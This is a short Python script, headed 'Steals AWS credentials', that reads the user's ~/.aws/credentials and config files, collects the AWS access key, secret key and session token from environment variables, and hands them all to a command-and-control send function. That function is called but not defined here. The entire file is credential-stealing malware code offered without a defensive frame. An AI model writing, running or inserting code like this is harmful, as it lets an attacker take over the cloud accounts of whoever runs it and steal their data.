# Steals AWS credentials
import os
from pathlib import Path

home = Path.home()

# Read AWS credentials
aws_creds = (home / '.aws' / 'credentials').read_text()
aws_config = (home / '.aws' / 'config').read_text()

# Also grab environment variables
aws_env = {
    'AWS_ACCESS_KEY_ID': os.environ.get('AWS_ACCESS_KEY_ID'),
    'AWS_SECRET_ACCESS_KEY': os.environ.get('AWS_SECRET_ACCESS_KEY'),
    'AWS_SESSION_TOKEN': os.environ.get('AWS_SESSION_TOKEN'),
}

# Exfiltrate
send_to_c2(aws_creds, aws_config, aws_env)
